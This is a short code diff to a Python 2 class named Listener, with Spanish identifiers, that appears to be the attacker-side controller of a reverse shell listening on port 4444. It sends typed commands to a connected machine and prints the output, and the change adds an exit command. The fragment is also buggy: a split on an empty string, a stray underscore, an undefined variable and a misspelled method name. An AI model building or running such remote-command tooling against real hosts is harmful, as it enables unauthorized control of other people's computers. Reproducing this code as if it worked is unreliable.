@@ -26,13 +26,19 @@ class Listener:
 
     def ejecutar_remoto(self, command):
         self.reliable_send(command)
+        
+        if command[0] == "salir":
+            self.connection.close()
+            exit()
+            
         return self.reliable_recive(data)
 
 
     def run(self):
         while True:
             command = raw_input(">> ")
-            result = self.ejecutar_remoto(command)
+            command = command.split("")
+            result = self.ejecutar_remoto(command)_
             print(result)
 
 escuchar = Listener("ip", 4444)
